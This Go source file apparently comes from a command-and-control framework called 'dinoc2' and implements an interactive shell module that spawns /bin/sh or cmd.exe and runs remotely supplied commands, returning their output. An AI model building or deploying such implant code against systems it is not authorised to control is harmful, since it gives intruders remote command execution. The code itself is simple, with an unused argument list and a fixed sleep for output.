package shell

import (
	"bytes"
	"fmt"
	"io"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"dinoc2/pkg/module"
)

// ShellModule implements a shell command execution module
type ShellModule struct {
	name        string
	description string
	cmd         *exec.Cmd
	stdin       io.WriteCloser
	stdout      *bytes.Buffer
	stderr      *bytes.Buffer
	mutex       sync.Mutex
	isRunning   bool
	isPaused    bool
}

// NewShellModule creates a new shell module
func NewShellModule() module.Module {
	return &ShellModule{
		name:        "shell",
		description: "Interactive shell access",
		stdout:      &bytes.Buffer{},
		stderr:      &bytes.Buffer{},
	}
}

// Init initializes the module
func (m *ShellModule) Init(params map[string]interface{}) error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if already running
	if m.isRunning {
		return fmt.Errorf("shell already running")
	}

	// Determine shell command based on OS
	var shellPath string
	var shellArgs []string

	switch runtime.GOOS {
	case "windows":
		shellPath = "cmd.exe"
		shellArgs = []string{"/c"}
	default: // Linux, macOS, etc.
		shellPath = "/bin/sh"
		shellArgs = []string{"-c"}
	}

	// Create command
	m.cmd = exec.Command(shellPath)
	
	// Set up pipes
	var err error
	m.stdin, err = m.cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdin pipe: %w", err)
	}

	// Set up stdout and stderr
	m.cmd.Stdout = m.stdout
	m.cmd.Stderr = m.stderr

	// Start the command
	err = m.cmd.Start()
	if err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	m.isRunning = true

	return nil
}

// Exec executes a command in the shell
func (m *ShellModule) Exec(command string, args ...interface{}) (interface{}, error) {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil, fmt.Errorf("shell not running")
	}

	// Check if paused
	if m.isPaused {
		return nil, fmt.Errorf("shell is paused")
	}

	// Clear buffers
	m.stdout.Reset()
	m.stderr.Reset()

	// Write command to stdin
	_, err := m.stdin.Write([]byte(command + "\n"))
	if err != nil {
		return nil, fmt.Errorf("failed to write command: %w", err)
	}

	// Wait for command to complete
	// In a real implementation, this would be more sophisticated
	time.Sleep(500 * time.Millisecond)

	// Get output
	output := m.stdout.String()
	errOutput := m.stderr.String()

	// Combine output
	result := output
	if errOutput != "" {
		result += "\nERROR: " + errOutput
	}

	return result, nil
}

// Shutdown shuts down the module
func (m *ShellModule) Shutdown() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil
	}

	// Close stdin
	if m.stdin != nil {
		m.stdin.Close()
	}

	// Kill the process
	if m.cmd != nil && m.cmd.Process != nil {
		err := m.cmd.Process.Kill()
		if err != nil {
			return fmt.Errorf("failed to kill shell process: %w", err)
		}
	}

	m.isRunning = false

	return nil
}

// GetStatus returns the module status
func (m *ShellModule) GetStatus() module.ModuleStatus {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	status := module.ModuleStatus{
		Running: m.isRunning,
		Stats: map[string]interface{}{
			"paused": m.isPaused,
		},
	}

	return status
}

// GetCapabilities returns the module capabilities
func (m *ShellModule) GetCapabilities() []string {
	return []string{
		"execute",
		"interactive",
	}
}

// Pause temporarily pauses the module's operations
func (m *ShellModule) Pause() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if m.isPaused {
		return nil // Already paused
	}

	m.isPaused = true
	return nil
}

// Resume resumes the module's operations after a pause
func (m *ShellModule) Resume() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if !m.isPaused {
		return nil // Not paused
	}

	m.isPaused = false
	return nil
}
